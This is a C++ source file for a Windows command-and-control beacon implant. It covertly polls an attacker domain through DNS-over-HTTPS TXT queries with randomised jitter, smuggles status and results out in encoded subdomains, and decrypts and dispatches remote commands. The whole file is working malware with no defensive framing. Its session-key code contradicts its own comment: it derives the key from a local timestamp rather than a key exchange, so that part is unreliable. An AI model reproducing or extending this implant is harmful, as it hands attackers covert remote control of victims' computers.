#include "beacon.hpp"
#include <windows.h>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <thread>

namespace l4g::c2 {

Beacon::Beacon(DohClient* doh, CommandDispatcher* dispatcher, const std::string& agent_id)
    : doh_(doh), dispatcher_(dispatcher), agent_id_(agent_id) {}

Beacon::~Beacon() {
    stop();
}

void Beacon::start() {
    if (running_.exchange(true)) return;
    if (!establish_session()) return;
    beacon_thread_ = std::thread(&Beacon::beacon_loop, this);
}

void Beacon::stop() {
    if (!running_.exchange(false)) return;
    if (beacon_thread_.joinable()) beacon_thread_.join();
}

void Beacon::set_interval(uint32_t min_ms, uint32_t max_ms) {
    min_interval_ = min_ms;
    max_interval_ = max_ms;
}

void Beacon::force_beacon() {
    auto payload = build_beacon_payload();
    std::string subdomain = agent_id_ + ".beacon." + crypto::base64url_encode(payload) + ".l4g.c2";
    auto response = doh_->query(subdomain, "TXT");
    if (response.success) process_response(response.data);
}

bool Beacon::send_status(const std::string& status_json) {
    std::vector<uint8_t> data(status_json.begin(), status_json.end());
    std::vector<uint8_t> encrypted = CommandDispatcher::encrypt_command({Command::CMD_STATUS, data, sequence_++}, session_key_);
    std::string subdomain = agent_id_ + ".status." + crypto::base64url_encode(encrypted) + ".l4g.c2";
    auto response = doh_->query(subdomain, "TXT");
    return response.success;
}

bool Beacon::send_result(uint32_t sequence, const CommandResult& result) {
    std::string json = "{\"seq\":" + std::to_string(sequence) + ",\"ok\":" + (result.success ? "true" : "false") + 
                       ",\"err\":\"" + result.error + "\"}";
    std::vector<uint8_t> data(json.begin(), json.end());
    std::vector<uint8_t> encrypted = CommandDispatcher::encrypt_command({Command::CMD_STATUS, data, sequence}, session_key_);
    std::string subdomain = agent_id_ + ".result." + crypto::base64url_encode(encrypted) + ".l4g.c2";
    auto response = doh_->query(subdomain, "TXT");
    return response.success;
}

void Beacon::beacon_loop() {
    while (running_.load()) {
        jitter_sleep();
        
        auto payload = build_beacon_payload();
        std::string subdomain = agent_id_ + ".beacon." + crypto::base64url_encode(payload) + ".l4g.c2";
        auto response = doh_->query(subdomain, "TXT");
        
        if (response.success && !response.data.empty()) {
            process_response(response.data);
        }
    }
}

void Beacon::jitter_sleep() {
    static std::mt19937_64 rng((uint64_t)std::chrono::high_resolution_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<uint32_t> dist(min_interval_, max_interval_);
    std::this_thread::sleep_for(std::chrono::milliseconds(dist(rng)));
}

bool Beacon::establish_session() {
    // Generate ephemeral key pair, do ECDH with server
    // For now, derive from agent_id + timestamp
    std::string seed = agent_id_ + std::to_string(std::chrono::system_clock::now().time_since_epoch().count());
    session_key_ = crypto::hkdf_sha256(
        std::vector<uint8_t>(seed.begin(), seed.end()),
        std::vector<uint8_t>{'L','4','G','_','S','E','S','S','I','O','N'},
        crypto::AES_KEY_SIZE
    );
    return !session_key_.empty();
}

std::vector<uint8_t> Beacon::build_beacon_payload() {
    // Minimal heartbeat
    std::string json = "{\"v\":14,\"pid\":" + std::to_string(GetCurrentProcessId()) + ",\"t\":" + 
                       std::to_string(std::chrono::system_clock::now().time_since_epoch().count()) + "}";
    return std::vector<uint8_t>(json.begin(), json.end());
}

bool Beacon::process_response(const std::vector<uint8_t>& response) {
    auto cmd_opt = CommandDispatcher::decrypt_command(response, session_key_);
    if (!cmd_opt) return false;
    
    Command cmd = *cmd_opt;
    CommandResult result = dispatcher_->dispatch(cmd);
    send_result(cmd.sequence, result);
    return true;
}

} // namespace l4g::c2